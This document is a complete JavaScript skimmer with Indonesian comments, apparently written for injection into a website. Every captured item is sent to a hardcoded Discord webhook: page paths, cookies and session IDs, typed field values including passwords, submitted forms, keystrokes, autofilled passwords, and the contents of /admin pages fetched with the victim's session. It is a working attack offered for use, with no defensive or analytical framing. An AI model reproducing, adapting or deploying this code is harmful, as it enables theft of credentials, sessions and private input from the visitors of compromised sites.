
(function(){
  "use strict";

  var WH = "https://discord.com/api/webhooks/1516627039753605140/8VNqYb-cIYMLTg4dBoS1g2exxqGa4I51eQb8fU-xo9l8x1U2AjQR7Bs7MCkyQFrPR_GV";
  var HOST = location.hostname;

  /* ---------- 1. SENDER (queue + chunk + handle 429) ---------- */
  var queue = [], busy = false;

  function discordSend(message) {
    message = String(message);
    // Discord max 2000 char/pesan -> potong per 1900 biar aman
    for (var i = 0; i < message.length; i += 1900) {
      queue.push(message.slice(i, i + 1900));
    }
    if (!busy) pump();
  }

  function pump() {
    if (!queue.length) { busy = false; return; }
    busy = true;
    var msg = queue.shift();
    var xhr = new XMLHttpRequest();
    xhr.open("POST", WH, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 429) {
          // kena rate limit -> balikin ke queue, tunggu lebih lama
          queue.unshift(msg);
          setTimeout(pump, 5000);
          return;
        }
        setTimeout(pump, 1100);
      }
    };
    xhr.send(JSON.stringify({ content: msg }));
  }

  /* ---------- 2. PATH TRACKER (cari URL login admin asli) ---------- */
  var lastPath = "";
  function trackPath() {
    var p = location.pathname;
    if (p === lastPath) return;
    lastPath = p;
    if (/(login|signin|admin|panel|dashboard|account|profile|password|user|setting|session)/i.test(p)) {
      discordSend(
        "📍 NAVIGASI\n" +
        "Host : " + HOST + "\n" +
        "Path : " + p + "\n" +
        "Ref  : " + (document.referrer || "-")
      );
    }
  }

  /* ---------- 3. COOKIE GRAB (deteksi session ID) ---------- */
  function grabCookies(tag) {
    var c = document.cookie;
    if (!c) return;
    var sess = /(phpsessid|jsessionid|sessionid|connect\.sid|ci_session|laravel_session|token)/i.test(c);
    discordSend(
      (sess ? "🎯 COOKIES — MENGANDUNG SESSION ID [" + tag + "]" : "🍪 COOKIES [" + tag + "]") + "\n" +
      "Host : " + HOST + "\n\n" + c
    );
  }

  /* ---------- 4. INPUT GRABBER (debounce, anti-spam) ---------- */
  var fieldTimers = {}, fieldIdx = 0;

  function sendField(t) {
    discordSend(
      "📥 INPUT di " + HOST + "\n" +
      "URL  : " + location.href + "\n" +
      "Name : " + (t.name || t.id || "(no-name)") + "  [" + (t.type || "text") + "]\n" +
      "Value: " + (t.value || "")
    );
  }

  document.addEventListener("input", function (e) {
    var t = e.target;
    if (!t || (t.tagName !== "INPUT" && t.tagName !== "TEXTAREA")) return;
    var type = (t.type || "text").toLowerCase();
    if (type === "password" || type === "email" || type === "text" ||
        type === "tel" || type === "number" || type === "search") {
      var key = (t.name || t.id || "field" + (++fieldIdx));
      clearTimeout(fieldTimers[key]);
      // tunggu 1 detik setelah berhenti ngetik -> 1 pesan, bukan per huruf
      fieldTimers[key] = setTimeout(function () { sendField(t); }, 1000);
    }
  }, true);

  /* ---------- 5. FORM SUBMIT GRABBER (username+password+CSRF) ---------- */
  document.addEventListener("submit", function (e) {
    var f = e.target;
    if (!f || typeof f.querySelectorAll !== "function") return;
    var rows = [], raw = [];
    var inputs = f.querySelectorAll("input, textarea, select");
    for (var i = 0; i < inputs.length; i++) {
      var el = inputs[i];
      var tp = (el.type || "text").toLowerCase();
      var nm = el.name || el.id || "(no-name)";
      var v  = el.value || "";
      if (tp === "hidden" || tp === "button" || tp === "submit" ||
          tp === "image" || tp === "reset" || tp === "file") continue;
      var icon = tp === "password" ? "🔑" : (tp === "email" ? "📧" : "📎");
      rows.push(icon + " [" + tp + "] " + nm + " : " + v);
      raw.push(nm + "=" + v);
    }
    if (!rows.length) return;
    discordSend(
      "🛡️ FORM DI-SUBMIT\n" +
      "Host : " + HOST + "\n" +
      "URL  : " + location.href + "\n\n" +
      rows.join("\n") +
      "\n\n📦 RAW (base64): " + btoa(unescape(encodeURIComponent(raw.join("&"))))
    );
  }, true);

  /* ---------- 6. KEYLOGGER (buffer, batch 4 detik) ---------- */
  var keys = [], keyTimer = null;
  document.addEventListener("keydown", function (e) {
    var k = e.key;
    var map = {Enter:"[ENTER]", Backspace:"[BS]", Tab:"[TAB]", Shift:"[SHIFT]",
               Control:"[CTRL]", Alt:"[ALT]", CapsLock:"[CAPS]",
               ArrowUp:"[↑]", ArrowDown:"[↓]", ArrowLeft:"[←]", ArrowRight:"[→]",
               Escape:"[ESC]", Delete:"[DEL]"};
    if (map[k]) k = map[k];
    else if (k && k.length > 1) k = "[" + k.toUpperCase() + "]";
    keys.push(k);
    if (keys.length >= 60) flushKeys();
    else { clearTimeout(keyTimer); keyTimer = setTimeout(flushKeys, 4000); }
  });

  function flushKeys() {
    if (!keys.length) return;
    var data = keys.join("");
    keys = [];
    discordSend(
      "⌨️ KEYLOG di " + HOST + "\n" +
      "URL  : " + location.href + "\n" +
      "Isi  : " + data
    );
  }

  /* ---------- 7. SESSION RIDING (baca halaman protected — HttpOnly tetap jalan) ---------- */
  var RIDE = ["/admin", "/admin/", "/admin/index.php", "/admin/dashboard.php", "/panel", "/dashboard"];
  function ride() {
    var done = 0;
    RIDE.forEach(function (p) {
      if (done >= 3) return;
      var xhr = new XMLHttpRequest();
      xhr.open("GET", p, true);
      xhr.withCredentials = true;   // cookie httpOnly ikut terkirim otomatis
      xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4 || xhr.status !== 200) return;
        var html = xhr.responseText || "";
        var title = (html.match(/<title[^>]*>([^<]*)<\/title>/i) || [])[1] || "";
        var text = html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
        if (/(welcome|selamat datang|dashboard|logout|profile|admin panel|admin)/i.test(text.slice(0, 2000)) ||
            /(admin|dashboard|panel|logout)/i.test(title)) {
          done++;
          discordSend(
            "🔓 SESSION RIDING OK — halaman protected kebaca\n" +
            "URL   : " + p + "\n" +
            "Title : " + title + "\n\n" +
            text.slice(0, 600)
          );
        }
      };
      try { xhr.send(null); } catch (e) {}
    });
  }

  /* ---------- 8. BONUS: tangkap autofill password manager ---------- */
  try {
    var st = document.createElement("style");
    st.textContent = "@keyframes phxAuto{from{opacity:1}to{opacity:1}}" +
      "input:-webkit-autofill{animation-name:phxAuto;animation-duration:1ms}";
    (document.head || document.documentElement).appendChild(st);
  } catch (e) {}
  document.addEventListener("animationstart", function (e) {
    if (!e.animationName || e.animationName.indexOf("phxAuto") === -1) return;
    var t = e.target;
    setTimeout(function () { sendField(t); }, 300);
  }, true);

  /* ---------- INIT ---------- */
  function init() {
    trackPath();
    grabCookies("load");
    setTimeout(ride, 2000);

    window.addEventListener("pagehide", function () {
      flushKeys();
      grabCookies("pagehide");   // nangkep session cookie BARU setelah login
    });
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState === "visible") grabCookies("visible");
    });
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
  else init();

  // Test manual: ketik __test() di console halaman target
  window.__test = function () {
    discordSend("✅ TEST — webhook jalan dari " + HOST + "\nWaktu: " + new Date().toLocaleString());
  };
})();
